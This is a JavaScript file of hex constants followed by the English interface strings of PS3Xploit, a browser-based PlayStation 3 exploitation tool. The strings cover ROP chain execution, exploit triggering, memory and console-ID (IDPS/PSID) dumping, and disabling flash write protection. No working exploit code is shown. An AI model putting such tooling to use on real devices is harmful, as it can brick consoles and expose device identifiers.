var a18_r9=0x80141809;
var a18_r10=0x80141810;
var a18_r11=0x80141811;
var a18_r12=0x80141812;
var a18_r13=0x80141813;
var a18_r14=0x80141814;
var a18_r15=0x80141815;
var a18_r16=0x80141816;
var a18_r17=0x80141817;
var a18_r18=0x80141818;
var a18_r19=0x80141819;
var a18_r20=0x80141820;
var a18_r21=0x80141821;
var a18_r22=0x80141822;
var a18_r23=0x80141823;
var a18_r24=0x80141824;
var a18_r25=0x80141825;
var a18_r26=0x80141826;
var a18_r27=0x80141827;
var a18_r28=0x80141828;
var a18_r29=0x80141829;
var a18_r30=0x80141830;
var a18_r31=0x80141831;

var a19_r0=0x80141900;
var a19_r1=0x80141901;
var a19_r2=0x80141902;
var a19_r3=0x80141903;
var a19_r4=0x80141904;
var a19_r5=0x80141905;
var a19_r6=0x80141906;
var a19_r7=0x80141907;
var a19_r8=0x80141908;
var a19_r9=0x80141909;
var a19_r10=0x80141910;
var a19_r11=0x80141911;
var a19_r12=0x80141912;
var a19_r13=0x80141913;
var a19_r14=0x80141914;
var a19_r15=0x80141915;
var a19_r16=0x80141916;
var a19_r17=0x80141917;
var a19_r18=0x80141918;
var a19_r19=0x80141919;
var a19_r20=0x80141920;
var a19_r21=0x80141921;
var a19_r22=0x80141922;
var a19_r23=0x80141923;
var a19_r24=0x80141924;
var a19_r25=0x80141925;
var a19_r26=0x80141926;
var a19_r27=0x80141927;
var a19_r28=0x80141928;
var a19_r29=0x80141929;
var a19_r30=0x80141930;
var a19_r31=0x80141931;

var a20_r0=0x80142000;
var a20_r1=0x80142001;
var a20_r2=0x80142002;
var a20_r3=0x80142003;
var a20_r4=0x80142004;
var a20_r5=0x80142005;
var a20_r6=0x80142006;
var a20_r7=0x80142007;
var a20_r8=0x80142008;
var a20_r9=0x80142009;
var a20_r10=0x80142010;
var a20_r11=0x80142011;
var a20_r12=0x80142012;
var a20_r13=0x80142013;
var a20_r14=0x80142014;
var a20_r15=0x80142015;
var a20_r16=0x80142016;
var a20_r17=0x80142017;
var a20_r18=0x80142018;
var a20_r19=0x80142019;
var a20_r20=0x80142020;
var a20_r21=0x80142021;
var a20_r22=0x80142022;
var a20_r23=0x80142023;
var a20_r24=0x80142024;
var a20_r25=0x80142025;
var a20_r26=0x80142026;
var a20_r27=0x80142027;
var a20_r28=0x80142028;
var a20_r29=0x80142029;
var a20_r30=0x80142030;
var a20_r31=0x80142031;

var a21_r0=0x80142100;
var a21_r1=0x80142101;
var a21_r2=0x80142102;
var a21_r3=0x80142103;
var a21_r4=0x80142104;
var a21_r5=0x80142105;
var a21_r6=0x80142106;
var a21_r7=0x80142107;
var a21_r8=0x80142108;
var a21_r9=0x80142109;
var a21_r10=0x80142110;
var a21_r11=0x80142111;
var a21_r12=0x80142112;
var a21_r13=0x80142113;
var a21_r14=0x80142114;
var a21_r15=0x80142115;
var a21_r16=0x80142116;
var a21_r17=0x80142117;
var a21_r18=0x80142118;
var a21_r19=0x80142119;
var a21_r20=0x80142120;
var a21_r21=0x80142121;
var a21_r22=0x80142122;
var a21_r23=0x80142123;
var a21_r24=0x80142124;
var a21_r25=0x80142125;
var a21_r26=0x80142126;
var a21_r27=0x80142127;
var a21_r28=0x80142128;
var a21_r29=0x80142129;
var a21_r30=0x80142130;
var a21_r31=0x80142131;

var a22_r0=0x80142200;
var a22_r1=0x80142201;
var a22_r2=0x80142202;
var a22_r3=0x80142203;
var a22_r4=0x80142204;
var a22_r5=0x80142205;
var a22_r6=0x80142206;
var a22_r7=0x80142207;
var a22_r8=0x80142208;
var a22_r9=0x80142209;
var a22_r10=0x80142210;
var a22_r11=0x80142211;
var a22_r12=0x80142212;
var a22_r13=0x80142213;
var a22_r14=0x80142214;
var a22_r15=0x80142215;
var a22_r16=0x80142216;
var a22_r17=0x80142217;
var a22_r18=0x80142218;
var a22_r19=0x80142219;
var a22_r20=0x80142220;
var a22_r21=0x80142221;
var a22_r22=0x80142222;
var a22_r23=0x80142223;
var a22_r24=0x80142224;
var a22_r25=0x80142225;
var a22_r26=0x80142226;
var a22_r27=0x80142227;
var a22_r28=0x80142228;
var a22_r29=0x80142229;
var a22_r30=0x80142230;
var a22_r31=0x80142231;

var a23_r0=0x80142300;
var a23_r1=0x80142301;
var a23_r2=0x80142302;
var a23_r3=0x80142303;
var a23_r4=0x80142304;
var a23_r5=0x80142305;
var a23_r6=0x80142306;
var a23_r7=0x80142307;
var a23_r8=0x80142308;
var a23_r9=0x80142309;
var a23_r10=0x80142310;
var a23_r11=0x80142311;
var a23_r12=0x80142312;
var a23_r13=0x80142313;
var a23_r14=0x80142314;
var a23_r15=0x80142315;
var a23_r16=0x80142316;
var a23_r17=0x80142317;
var a23_r18=0x80142318;
var a23_r19=0x80142319;
var a23_r20=0x80142320;
var a23_r21=0x80142321;
var a23_r22=0x80142322;
var a23_r23=0x80142323;
var a23_r24=0x80142324;
var a23_r25=0x80142325;
var a23_r26=0x80142326;
var a23_r27=0x80142327;
var a23_r28=0x80142328;
var a23_r29=0x80142329;
var a23_r30=0x80142330;
var a23_r31=0x80142331;

var a24_r0=0x80142400;
var a24_r1=0x80142401;
var a24_r2=0x80142402;
var a24_r3=0x80142403;
var a24_r4=0x80142404;
var a24_r5=0x80142405;
var a24_r6=0x80142406;
var a24_r7=0x80142407;
var a24_r8=0x80142408;
var a24_r9=0x80142409;
var a24_r10=0x80142410;
var a24_r11=0x80142411;
var a24_r12=0x80142412;
var a24_r13=0x80142413;
var a24_r14=0x80142414;
var a24_r15=0x80142415;
var a24_r16=0x80142416;
var a24_r17=0x80142417;
var a24_r18=0x80142418;
var a24_r19=0x80142419;
var a24_r20=0x80142420;
var a24_r21=0x80142421;
var a24_r22=0x80142422;
var a24_r23=0x80142423;
var a24_r24=0x80142424;
var a24_r25=0x80142425;
var a24_r26=0x80142426;
var a24_r27=0x80142427;
var a24_r28=0x80142428;
var a24_r29=0x80142429;
var a24_r30=0x80142430;
var a24_r31=0x80142431;

var a25_r0=0x80142500;
var a25_r1=0x80142501;
var a25_r2=0x80142502;
var a25_r3=0x80142503;
var a25_r4=0x80142504;
var a25_r5=0x80142505;
var a25_r6=0x80142506;
var a25_r7=0x80142507;
var a25_r8=0x80142508;
var a25_r9=0x80142509;
var a25_r10=0x80142510;
var a25_r11=0x80142511;
var a25_r12=0x80142512;
var a25_r13=0x80142513;
var a25_r14=0x80142514;
var a25_r15=0x80142515;
var a25_r16=0x80142516;
var a25_r17=0x80142517;
var a25_r18=0x80142518;
var a25_r19=0x80142519;
var a25_r20=0x80142520;
var a25_r21=0x80142521;
var a25_r22=0x80142522;
var a25_r23=0x80142523;
var a25_r24=0x80142524;
var a25_r25=0x80142525;
var a25_r26=0x80142526;
var a25_r27=0x80142527;
var a25_r28=0x80142528;
var a25_r29=0x80142529;
var a25_r30=0x80142530;
var a25_r31=0x80142531;

var a26_r0=0x80142600;
var a26_r1=0x80142601;
var a26_r2=0x80142602;
var a26_r3=0x80142603;
var a26_r4=0x80142604;
var a26_r5=0x80142605;
var a26_r6=0x80142606;
var a26_r7=0x80142607;
var a26_r8=0x80142608;
var a26_r9=0x80142609;
var a26_r10=0x80142610;
var a26_r11=0x80142611;
var a26_r12=0x80142612;
var a26_r13=0x80142613;
var a26_r14=0x80142614;
var a26_r15=0x80142615;
var a26_r16=0x80142616;
var a26_r17=0x80142617;
var a26_r18=0x80142618;
var a26_r19=0x80142619;
var a26_r20=0x80142620;
var a26_r21=0x80142621;
var a26_r22=0x80142622;
var a26_r23=0x80142623;
var a26_r24=0x80142624;
var a26_r25=0x80142625;
var a26_r26=0x80142626;
var a26_r27=0x80142627;
var a26_r28=0x80142628;
var a26_r29=0x80142629;
var a26_r30=0x80142630;
var a26_r31=0x80142631;

var a27_r0=0x80142700;
var a27_r1=0x80142701;
var a27_r2=0x80142702;
var a27_r3=0x80142703;
var a27_r4=0x80142704;
var a27_r5=0x80142705;
var a27_r6=0x80142706;
var a27_r7=0x80142707;
var a27_r8=0x80142708;
var a27_r9=0x80142709;
var a27_r10=0x80142710;
var a27_r11=0x80142711;
var a27_r12=0x80142712;
var a27_r13=0x80142713;
var a27_r14=0x80142714;
var a27_r15=0x80142715;
var a27_r16=0x80142716;
var a27_r17=0x80142717;
var a27_r18=0x80142718;
var a27_r19=0x80142719;
var a27_r20=0x80142720;
var a27_r21=0x80142721;
var a27_r22=0x80142722;
var a27_r23=0x80142723;
var a27_r24=0x80142724;
var a27_r25=0x80142725;
var a27_r26=0x80142726;
var a27_r27=0x80142727;
var a27_r28=0x80142728;
var a27_r29=0x80142729;
var a27_r30=0x80142730;
var a27_r31=0x80142731;

var a28_r0=0x80142800;
var a28_r1=0x80142801;
var a28_r2=0x80142802;
var a28_r3=0x80142803;
var a28_r4=0x80142804;
var a28_r5=0x80142805;
var a28_r6=0x80142806;
var a28_r7=0x80142807;
var a28_r8=0x80142808;
var a28_r9=0x80142809;
var a28_r10=0x80142810;
var a28_r11=0x80142811;
var a28_r12=0x80142812;
var a28_r13=0x80142813;
var a28_r14=0x80142814;
var a28_r15=0x80142815;
var a28_r16=0x80142816;
var a28_r17=0x80142817;
var a28_r18=0x80142818;
var a28_r19=0x80142819;
var a28_r20=0x80142820;
var a28_r21=0x80142821;
var a28_r22=0x80142822;
var a28_r23=0x80142823;
var a28_r24=0x80142824;
var a28_r25=0x80142825;
var a28_r26=0x80142826;
var a28_r27=0x80142827;
var a28_r28=0x80142828;
var a28_r29=0x80142829;
var a28_r30=0x80142830;
var a28_r31=0x80142831;

var a29_r0=0x80142900;
var a29_r1=0x80142901;
var a29_r2=0x80142902;
var a29_r3=0x80142903;
var a29_r4=0x80142904;
var a29_r5=0x80142905;
var a29_r6=0x80142906;
var a29_r7=0x80142907;
var a29_r8=0x80142908;
var a29_r9=0x80142909;
var a29_r10=0x80142910;
var a29_r11=0x80142911;
var a29_r12=0x80142912;
var a29_r13=0x80142913;
var a29_r14=0x80142914;
var a29_r15=0x80142915;
var a29_r16=0x80142916;
var a29_r17=0x80142917;
var a29_r18=0x80142918;
var a29_r19=0x80142919;
var a29_r20=0x80142920;
var a29_r21=0x80142921;
var a29_r22=0x80142922;
var a29_r23=0x80142923;
var a29_r24=0x80142924;
var a29_r25=0x80142925;
var a29_r26=0x80142926;
var a29_r27=0x80142927;
var a29_r28=0x80142928;
var a29_r29=0x80142929;
var a29_r30=0x80142930;
var a29_r31=0x80142931;

var a30_r0=0x80143000;
var a30_r1=0x80143001;
var a30_r2=0x80143002;
var a30_r3=0x80143003;
var a30_r4=0x80143004;
var a30_r5=0x80143005;
var a30_r6=0x80143006;
var a30_r7=0x80143007;
var a30_r8=0x80143008;
var a30_r9=0x80143009;
var a30_r10=0x80143010;
var a30_r11=0x80143011;
var a30_r12=0x80143012;
var a30_r13=0x80143013;
var a30_r14=0x80143014;
var a30_r15=0x80143015;
var a30_r16=0x80143016;
var a30_r17=0x80143017;
var a30_r18=0x80143018;
var a30_r19=0x80143019;
var a30_r20=0x80143020;
var a30_r21=0x80143021;
var a30_r22=0x80143022;
var a30_r23=0x80143023;
var a30_r24=0x80143024;
var a30_r25=0x80143025;
var a30_r26=0x80143026;
var a30_r27=0x80143027;
var a30_r28=0x80143028;
var a30_r29=0x80143029;
var a30_r30=0x80143030;
var a30_r31=0x80143031;

var a31_r0=0x80143100;
var a31_r1=0x80143101;
var a31_r2=0x80143102;
var a31_r3=0x80143103;
var a31_r4=0x80143104;
var a31_r5=0x80143105;
var a31_r6=0x80143106;
var a31_r7=0x80143107;
var a31_r8=0x80143108;
var a31_r9=0x80143109;
var a31_r10=0x80143110;
var a31_r11=0x80143111;
var a31_r12=0x80143112;
var a31_r13=0x80143113;
var a31_r14=0x80143114;
var a31_r15=0x80143115;
var a31_r16=0x80143116;
var a31_r17=0x80143117;
var a31_r18=0x80143118;
var a31_r19=0x80143119;
var a31_r20=0x80143120;
var a31_r21=0x80143121;
var a31_r22=0x80143122;
var a31_r23=0x80143123;
var a31_r24=0x80143124;
var a31_r25=0x80143125;
var a31_r26=0x80143126;
var a31_r27=0x80143127;
var a31_r28=0x80143128;
var a31_r29=0x80143129;
var a31_r30=0x80143130;
var a31_r31=0x80143131;

var a32_r0=0x80143200;
var a32_r1=0x80143201;
var a32_r2=0x80143202;
var a32_r3=0x80143203;
var a32_r4=0x80143204;
var a32_r5=0x80143205;
var a32_r6=0x80143206;
var a32_r7=0x80143207;
var a32_r8=0x80143208;
var a32_r9=0x80143209;
var a32_r10=0x80143210;
var a32_r11=0x80143211;
var a32_r12=0x80143212;
var a32_r13=0x80143213;
var a32_r14=0x80143214;
var a32_r15=0x80143215;
var a32_r16=0x80143216;
var a32_r17=0x80143217;
var a32_r18=0x80143218;
var a32_r19=0x80143219;
var a32_r20=0x80143220;
var a32_r21=0x80143221;
var a32_r22=0x80143222;
var a32_r23=0x80143223;
var a32_r24=0x80143224;
var a32_r25=0x80143225;
var a32_r26=0x80143226;
var a32_r27=0x80143227;
var a32_r28=0x80143228;
var a32_r29=0x80143229;
var a32_r30=0x80143230;
var a32_r31=0x80143231;

var a33_r0=0x80143300;
var a33_r1=0x80143301;
var a33_r2=0x80143302;
var a33_r3=0x80143303;
var a33_r4=0x80143304;
var a33_r5=0x80143305;
var a33_r6=0x80143306;
var a33_r7=0x80143307;
var a33_r8=0x80143308;
var a33_r9=0x80143309;
var a33_r10=0x80143310;
var a33_r11=0x80143311;
var a33_r12=0x80143312;
var a33_r13=0x80143313;
var a33_r14=0x80143314;
var a33_r15=0x80143315;
var a33_r16=0x80143316;
var a33_r17=0x80143317;
var a33_r18=0x80143318;
var a33_r19=0x80143319;
var a33_r20=0x80143320;
var a33_r21=0x80143321;
var a33_r22=0x80143322;
var a33_r23=0x80143323;
var a33_r24=0x80143324;
var a33_r25=0x80143325;
var a33_r26=0x80143326;
var a33_r27=0x80143327;
var a33_r28=0x80143328;
var a33_r29=0x80143329;
var a33_r30=0x80143330;
var a33_r31=0x80143331;
// PS3Xploit Default GUI Messages [English US]
// PS3Xploit Team 2018 / ps3xploit.com

// Language Template


// After complete translate the language file update it to latest revision (same as en-US)
var current_minimum_lang_revision="0011";
var gui_incomplete_lang="Current translation is incomplete, consider updating or just skip it";

var msg_select_vsh_type="Use CEX?\n\nSelecting NO will use DEX offsets";

var msg_detected_fw_1="Detected FW: ";
var msg_detected_fw_2=" ";
//var msg_detected_fw_3=" / MinVer: ";
var msg_detected_fw_4=" | Supports ALL Models and 4.xx Firmware";

var compat_msg_wrong_fw1="Your PS3 is not on a compatible version! Your current running FW version is ";
var compat_msg_wrong_fw2=", which is not compatible with PS3Xploit. All features have been disabled";
var compat_msg_success1="Congratulations! We've detected your PlayStation 3 is running FW ";
var compat_msg_success2=", which is compatible with PS3Xploit! Enjoy!";

var msg_option_not_available="This Option Is Not Available Yet!";

// Settings
var msg_settings_load="This is experimental and loads settings from a cookie!";
var msg_settings_save="This is experimental and saves settings to a cookie!";

// MinVer/CFW Compatibility
var msg_minver_loaded_into_mem="MinVer Return Value Loaded Into Memory!\n\nPress Execute Button Again To Read and Display!";
var msg_minver_start="Your Minimum Downgrade Version is ";
var msg_minver_mid=" and is ";
var msg_minver_end=" compatible with CFW at this time!";
var msg_minver_compat_not="NOT";

// CELL/RSX Temperatures
var msg_temps_loaded_into_mem="CELL/RSX Temp Return Values Loaded Into Memory!\n\nPress Execute Button Again To Read and Display!";
var msg_temps_cell="CELL Temperature: ";
var msg_temps_rsx="\n\nRSX Temperature: ";
var msg_temps_celcius=" Celcius";

// MemDump
var msg_memdump_warning="Warning!\n\nThis test will freeze if an unallocated memory area is hit during dumping process!\n\nYou will still get a valid dump, up until the crash!";
var msg_memdump_idps_vsh="Only 4.66/4.81/4.82 Currently Supported For Dumping IDPS Direct From VSH Memory!\n\nFlash Extract IDPS Based Chain Is Different.\n\nAll other FW versions will probably just dump all 0s.";
var msg_memdump_size="Raw VSH MemDump Values\n\nSize: 0x";
var msg_memdump_start_addr="\nStart Address: 0x";
var msg_memdump_end_addr="\nEnd Address: 0x";

// Warnings
var msg_fd_close_warning="File Descriptors Are Currently Not Closed Automatically!";
var msg_remove_dir_warning="WARNING!\n\nBe careful while using this syscall.\n\nYou can remove a needed directory and have to reinstall firmware!";
var msg_warning_write_protection="Write Protection Disabled!\n\nProceed With CAUTION!!!";

var msg_cobra_only="ALERT!\n\nThis ONLY Works With COBRA Enabled On CFW!";

var msg_mount_test="** IN TESTING PHASE **";

// File Operations
var msg_default_size="Using Default Size 0x140";
var msg_new_size="New FileSize: ";
var msg_destination_path_set_new="New Path Set To:\n\n";
var msg_destination_path_incorrect="Destination Path Is Incorrect!\n\nIt Must Be Set Before Changing Title ID.";

// Trigger Messages
var trigger_msg="Triggering exploit...";
var trigger_msg2="Trigger: 0x";

// Ready To Search
var msg_search_ready="<h3><b>Ready To Begin! <br>Select Chain and Options From Above, Then Press Initialize ROP Chain button!</b></h3>";

// Shows After Initial Exec Button Click
var msg_exec_init="<h3><b>Executing Chain! <br>Please Wait Until The Execution Has Finished....</b></h3>";

// Search Strings
var msg_search_offsets="<h3><b>Searching For Offsets In Memory! Please Wait.... <br>If You Are Impatient, Close The Browser and Try Again In About 60-90 Seconds If Not Found!</b></h3>";
var msg_verify_offsets="<h3><b>Verifying Offsets In Memory! Please Wait.... <br>DO NOT Close The Browser Yet!</b></h3>";

// Fail Search Messages
var msg_string_search_fail="<h3><b><font color='#7700DA'>Did Not Find All Offsets!</font><font color='#7700DA'> If Search Fails Again, Adjust Search Settings or RESTART browser!</font></b></h3>";
var msg_string_search_fail_max="<h3><b><font color='#7700DA'>Did Not Find All Offsets!</font><font color='#7700DA'> Max Retries Attempted! Please RESTART browser!</font></b></h3>";

// Verify Strings Fail
var msg_string_verify_fail="<h3><b><font color='#7700DA'>Did Not Verify All Offsets!</font><font color='#7700DA'> If Verify Fails Again, RESTART browser!</font></b></h3>";
var msg_string_verify_fail_max="<h3><b><font color='#7700DA'>Did Not Verify All Offsets!</font><font color='#7700DA'> Max Retries Attempted! Please RESTART browser!</font></b></h3>";

// Init Success
var msg_success_init="<h3><b><font color='#386E38'>SUCCESS!</font><br><font color='#7700DA'>You Can Now Execute Your Chain!</font></b></h3>";

// Exec Success
var success_chain_exec="<h3><b><font color='#386E38'>Chain Executed Successfully!</font></b><br> &nbsp;</h3>";
var success_chain_exec_press_again="<h3><b><font color='#386E38'>Press The Execute Button Once More!</font></b></h3>";
var success_chain_exec_psid="<h3><b><font color='#386E38'>PSID Dumped Successfully!</font></b></h3>";
var success_chain_exec_idps="<h3><b><font color='#386E38'>IDPS Dumped Successfully!</font></b></h3>";
var success_chain_exec_syscall_dump="<h3><b><font color='#386E38'>Syscall Return Value Dumped Successfully!</font></b></h3>";
var success_chain_exec_memdump="<h3><b><font color='#386E38'>Memory Dumped Successfully!</font></b></h3>";
var success_chain_exec_read_write_file="<h3><b><font color='#386E38'>Successfully Transferred Source To Destination!</font></b></h3>";
var success_mount_device="<h3><b><font color='#386E38'>Successfully Mounted Device!</font></b></h3>";

// Compatibility/Offset Messages
var ua_msg="<hr><h3>PS3 System Browser Info: "+navigator.userAgent+ "</h3>";
var compat_msg_nops3="You are not on a PlayStation System! All features have been disabled";
var compat_msg_devs="This Is For Developers Only!\n\nCEX offsets will need to be added manually to /js/chains/offsets.js file, based on your DEX offsets in use for each chain.";
var experimental="Set Your Home Page To This Page!\n\nUSE AT YOUR OWN RISK!\nThere could be bugs and some things may not work!\n\nAll Models On 4.xx CEX and 4.81 DEX Are Supported";

// Other Messages
var msg_prerelease="THIS IS AN EARLY PREVIEW RELEASE!\n\nOLDER FIRMWARE SUPPORT HAS ONLY BEEN PARTIALLY IMPLEMENTED!\n\n4.81/4.82 ONLY UNTIL NEXT RELEASE!";
var msg_anti_piracy="DISCLAIMER\n\nWe DO NOT condone or endorse PIRACY of any kind!\n\nBy using this tutorial, and clicking YES, you agree to use it for educational purposes ONLY!";
var msg_anti_piracy_edat="ANTI-PIRACY DISCLAIMER!\n\nThis option is intended for testing and development purposes only, and should not be abused!\n\nBy clicking YES you agree to ONLY use this for titles that have been purchased!";

// Devices
var msg_device_loaded_into_mem="Device Return Value Loaded Into Memory!\n\nPress Execute Button Again To Read and Display!";
var msg_get_device_info1="Returned Device: ";
var msg_get_device_info2="\n\nUse This For sys_storage_report_devices Chain";

// Debugging

var msg_stackframe_check="This will check the default stackframe for problems.\n\nIf it crashes or does not display a success message, then there is an issue!";

// String Matching
var verify_fail="<font color='#7700DA'>FAIL: Strings Do Not Match In Memory!</font>";
var verify_success="<font color='#2a1003'>SUCCESS: Strings Match In Memory!</font>";
var verify_skip="<font color='#2a1003'>SUCCESS: Not Verifying Strings In Memory!</font>";

var msg_search_flash_type_start="Search Params Set For ";
var msg_search_flash_type_end=" Flash Type!";

var msg_chk_mem_arg_error="checkMemory function arguments error! size=0x";
var msg_malformed_html="Malformed HTML!";
var msg_string_located=" Found at offset: 0x";
var msg_string_not_located="could not be located in range";

// Found Offsets
var msg_found_offsets="<h4><b>Found Offsets: ";
var msg_verified_offsets="<h4><b>Verified Offsets: ";

var msg_page_args_not_set="Page Arguments Not Set!\n\nClick The Set Arguments Button and Retry!";
var msg_no_chain_selected="No ROP Chain Hex Selected\n\nUse The Drop-Down Box To Select One";
var msg_media_not_supported="This Media Choice Is Not Implemented Yet!";
var msg_cannot_continue="Cannot Continue....Returning!";

var msg_invalid_title_id="ALERT!\n\nThe Title ID Entered Has An Invalid Size!\n\nUsing Default ID.";

// index GUI text
var gui_title="PS3 Exploitation Tutorial Template ";
var guy_by="by ";
var gui_credits="Many thanks to xerpi for the userland memory leak exploit ps3 port, zecoxao & Joonie for their early & continued support, mysis for documenting vsh exports & plugins, the psdevwiki contributors of course, STLcardsWS for his long standing contribution & all ps3 community hackers/devs past & present, you know who you are. Thanks to littlebalup as well for providing the idea & the related js implementation we used to make the HDD edition of the Dumpers and Flasher. Also thanks to B7U3 C50SS, Endless, and 0x1991337 for tutorial syscall testing and other help! <font color='yellow'>More details & news on <a href='http://www.psx-place.com'>http://www.psx-place.com</a>. Official website at <a href='http://ps3xploit.com'>http://ps3xploit.com</a></font>";

// Checkboxes First Section
var gui_chk_default_settings="Default Settings:";
var gui_chk_disable_trigger="Disable Trigger:";
var gui_chk_write_protect="Write Protect:";

// Reboot Mode
var gui_chk_reboot_mode="Reboot Mode:";
var gui_chk_reboot_mode_select="* Select Mode *";
var gui_chk_reboot_mode_soft="Soft Reboot";
var gui_chk_reboot_mode_hard="Hard Reboot";
var gui_chk_reboot_mode_off="Power Down";

// ROP Chain Text

// Preset Chains
var gui_txt_preset_chains="Preset Chains: ";
var gui_txt_preset_chains_default="Default/Testing";
var gui_txt_option_stackframe_test="Stackframe Test";
var gui_txt_option_beep_test="Beep Test";
var gui_txt_option_power_test="Power Test";
var gui_txt_option_minver_check="Minimum Version Check";
var gui_txt_option_sys_game_get_temperature="Show CELL/RSX Temps";
var gui_txt_option_game_debug_pafjob_test="Game Debug PafJob Test";
var gui_txt_option_console_write_test="Console Write Test";
var gui_txt_option_sys_tty_read="TTY Read Test";
var gui_txt_option_sys_tty_write="TTY Write Test";

// Dumping
var gui_txt_preset_chains_dumping="Dumping";
var gui_txt_option_webkit_search_area="Dump WebKit Search Area";
var gui_txt_option_system_info_multi_dump="System Info Multi Dump";
var gui_txt_option_dump_lv2_syscall_table="Dump LV2 Syscall Table";
var gui_txt_option_mem_dump_test="Dump Raw VSH Memory";
var gui_txt_option_get_open_psid="Dump PSID";
var gui_txt_option_dump_idps_from_mem="Dump IDPS From VSH";
var gui_txt_option_sys_net_dump="SysNet Dump";
var gui_txt_sys_sm_get_platform_info="Get Platform Info";
var gui_txt_option_dump_idps_from_flash="Dump IDPS From Flash";

// File System
var gui_txt_preset_chains_file_system="File System";
var gui_txt_option_create_new_user="Create New User";
var gui_txt_option_db_rebuild="Database Rebuild";
var gui_txt_option_file_read_write_test="Read/Write File Test";
var gui_txt_option_dir_read_write_test="Read/Write Directory Test";

// Fun
var gui_txt_preset_chains_fun="Fun";
var gui_txt_option_fun_test="Beep Test";
var gui_txt_option_xmb_plugin_test="XMB Plugin Test";
var gui_txt_option_busy_icon_test="Busy Icon Test";
var gui_txt_option_vsh_printf_test="VSH printf Test";
var vsh_printf_arg1="MESSAGE: ";
var vsh_printf_arg2="HELLO FROM TEAM PS3XPLOIT!";

// Other Syscall Chains

// Memory/System
var gui_txt_syscall_group_mem_sys="Memory/System: ";
var gui_txt_syscall_chains_mem_sys="Memory";

// Storage
var gui_txt_syscall_chains_storage="Storage";

// System
var gui_txt_syscall_chains_system="System";

// Process/Thread

// Process
var gui_txt_syscall_group_proc_thread="Process/Thread: ";
var gui_txt_syscall_chains_proc_thread="Process";

// Process ID
var gui_txt_syscall_chains_process="Proc ID";

// Threads
var gui_txt_syscall_chains_threads="Threads";

// Thread ID
var gui_txt_syscall_chains_thread_id="Thread ID";

// Network
var gui_txt_syscall_group_network="Network: ";

var gui_txt_option_url="URL: ";

// Debugging
var gui_txt_syscall_group_debugging="Debugging: ";
var gui_txt_syscall_chains_debug_sc="System Calls";
var gui_txt_option_debug_placeholder="beep_test";

// LED Control
var gui_txt_syscall_group_led="LED Control:";
var gui_txt_syscall_chains_led="* Select Chain *";

var gui_txt_syscall_chains_led_color="Change Color";
var gui_txt_option_led_color_green="Green";
var gui_txt_option_led_color_yellow_red="Yellow/Red";
var gui_txt_option_led_color_off="Off";

var gui_txt_syscall_chains_led_action="Change Action";
var gui_txt_option_led_action_on="On";
var gui_txt_option_led_action_off="Off";
var gui_txt_option_led_action_blink_fast="Blink Fast";
var gui_txt_option_led_action_blink_slow="Blink Slow";

// Beep Parameters
var gui_txt_syscall_group_beep_params="Beep Parameters: ";
var gui_txt_syscall_chains_beeps="# of Beeps";
var gui_txt_option_beep_off="Turn Off";
var gui_txt_option_beep_3="3 Beeps";
var gui_txt_option_beep_2="2 Beeps";
var gui_txt_option_beep_2f="2 Beeps Fast";
var gui_txt_option_beep_1="1 Beep";
var gui_txt_option_beep_1f="1 Beep Fast";
var gui_txt_option_beep_flatline="Flatline";

// Memory Dump
var gui_txt_syscall_group_memdump="Memory Dump:";
var gui_txt_memdump_addresses="MemDump Address";
var gui_txt_memdump_size="MemDump Size";
var gui_txt_memdump_range_presets="Presets:";
var gui_txt_option_memdump_presets_default="* No Preset Selected *";

var gui_txt_memdump_address_start="Start:";
var gui_txt_memdump_address_end="End:";
var gui_txt_btn_memdump_set_values="Set New Values";

var gui_txt_mounting_setup="Mounting Options: ";
var gui_txt_option_mount_device="Device Name";
var gui_txt_option_mount_fs="File System";
var gui_txt_option_mount_path="Mount Path";

var gui_txt_group_user_id="User ID:";
var gui_txt_option_user_id_default="* Default *";
var gui_txt_user_id_new="User ID Set To: ";
var gui_txt_home_path_new="\n\nNew Home Path Is: \n\n";

var gui_txt_group_permissions="Permissions:";

var gui_txt_group_filesize="File Size:";
var gui_txt_group_titleid="TitleID:";

var gui_txt_btn_set_filesize="Set";
var gui_txt_btn_set_titleid="Set";

var gui_txt_group_path_source="Source:";
var gui_txt_group_path_destination="Destination: ";

// XMB Transfer
var gui_txt_syscall_group_xmb_transfer="XMB Transfer Option ";
var gui_txt_option_xmb_photo="Photo";
var gui_txt_option_xmb_music="Music";
var gui_txt_option_xmb_video="Video";
var gui_txt_option_xmb_jpg_btn="Press &#x25B3 For JPG";
var gui_txt_option_xmb_mp3_btn="Press &#x25B3 For MP3";
var gui_txt_option_xmb_mp4_btn="Press &#x25B3 For MP4";
var gui_txt_option_xmb_save_msg="&#x2192 File &#x2192 Save Target &#x2192 System Storage";

var gui_txt_group_payload_type="Payload Type ";
var gui_txt_group_payload_type_help="Replace default payloads with your own files, using the same names, and place in TEMPLATE/payloads/ folder under HTML source";

// String Search
var gui_txt_group_string_search="Search:";
var gui_txt_option_search_size="Size";
var gui_txt_option_search_base="Base";
var gui_txt_option_search_stack="Stack";
var gui_txt_option_search_range="Range";
var gui_txt_option_search_loops="Loops";

var gui_chk_search_verify_jumps="Verify Jumps:";
var gui_chk_search_verify_stackframe="Stackframe:";
var gui_chk_search_debug_output="Debug:";

// Buttons
var gui_txt_option_init_rop_btn="Initialize ROP Chain";
var gui_txt_option_exec_rop_btn="Press after 1 and 2";
var gui_txt_option_reload_page_btn="Reload Page";
var gui_txt_option_reset_btn="1. mount_FLSH1_FAT_DevBlind";
var gui_txt_option_load_settings_btn="2. Copy file to PS3";
var gui_txt_option_save_settings_btn="Save Settings";
var gui_txt_option_debug_show_var_btn="Show All Variables";
// PS3Xploit Index GUI Common Messages
// PS3Xploit Team 2018 / ps3xploit.com

// Common Language

// Index GUI Version
var gui_version="<font color='#FFF' size='3'>v0.2.0</font>";
var global_minimum_lang_revision="0011";

// Other Messages
var msg_thread_name="Hello_From_PS3Xploit";

// Debugging
var msg_debug_placeholder="Lazy XP +1";

// Check Memory
var msg_check_memory="checkMemory: ";

// Found Offsets
var offset_find_base_fp="base_fp";
var offset_find_stack_frame="stack_frame";
var offset_find_jump2="jump2";
var offset_find_jump1="jump1";

var offset_find_success="success";
var offset_find_verified="verified";

// Index GUI text
var gui_team="PS3Xploit Team: <b><font color='#7700DA'>W</font><font color='#FFF'> | </font><font color='#7700DA'>esc0rtd3w</font><font color='#FFF'> | </font><font color='#7700DA'>habib</font><font color='#FFF'> | </font><font color='#7700DA'>bguerville</font></b>";

// Checkboxes First Section
var gui_chk_flash_type_nand="NAND:";
var gui_chk_flash_type_nor=" NOR:";
var gui_chk_flash_type_emmc=" eMMC:";

// Other Syscall Chains

// Memory/System
var gui_txt_option_sys_rsx_memory_free="sys_rsx_memory_free";

// Storage
var gui_txt_option_sys_storage_report_devices="sys_storage_report_devices";
